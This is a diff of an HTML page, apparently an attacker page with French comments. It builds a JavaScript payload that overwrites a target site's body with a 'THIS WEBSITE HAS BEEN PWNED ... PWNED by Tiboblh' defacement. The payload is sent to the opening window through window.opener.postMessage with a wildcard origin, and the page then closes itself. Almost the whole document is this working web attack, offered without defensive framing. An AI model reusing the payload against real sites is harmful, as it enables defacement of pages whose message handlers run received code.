@@ -1,49 +1,36 @@
-<script>
-const payload = `
-document.body.innerHTML = \`
 <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>This Website Has Been PWNED</title>
-  <style>
-    body {
-      background: black;
-      color: #00ff00;
-      font-family: "Courier New", monospace;
-      margin: 0;
-      padding: 20px;
-      overflow: hidden;
-    }
-    h1 {
-      font-size: 80px;
-      text-align: center;
-      text-shadow: 0 0 20px #ff0000, 0 0 30px #00ffff;
-      margin-top: 20vh;
-    }
-    p {
-      text-align: center;
-      font-size: 24px;
-      margin-top: 20px;
-    }
-    .footer {
-      text-align: center;
-      font-size: 16px;
-      color: #ff5555;
-      margin-top: 50px;
-    }
-  </style>
+  <title>Payload</title>
 </head>
 <body>
-  <h1>THIS WEBSITE HAS BEEN PWNED</h1>
-  <p>All systems compromised. Enjoy the chaos!</p>
-  <p class="footer">-- PWNED by Tiboblh --</p>
-</body>
-</html>
+<script>
+// Ici, on ne met PAS de <html> complet dans le payload.
+// On envoie seulement du JavaScript exécutable sur la page cible.
+const payload = `
+document.body.innerHTML = \`
+  <h1 style="font-size:80px;text-align:center;margin-top:20vh;
+             color:#00ff00;font-family:'Courier New',monospace;
+             text-shadow:0 0 20px #ff0000,0 0 30px #00ffff;">
+    THIS WEBSITE HAS BEEN PWNED
+  </h1>
+  <p style="text-align:center;font-size:24px;color:#00ff00;
+            font-family:'Courier New',monospace;">
+    All systems compromised. Enjoy the chaos!
+  </p>
+  <p style="text-align:center;font-size:16px;color:#ff5555;
+            font-family:'Courier New',monospace;">
+    -- PWNED by Tiboblh --
+  </p>
 \`;
+document.body.style.background = "black";
+document.body.style.overflow = "hidden";
 `;
 
-
-window.opener.postMessage({maVariable: payload}, '*');
+// Envoi le JavaScript au parent
+window.opener.postMessage({ maVariable: payload }, '*');
 window.close();
 </script>
+</body>
+</html>
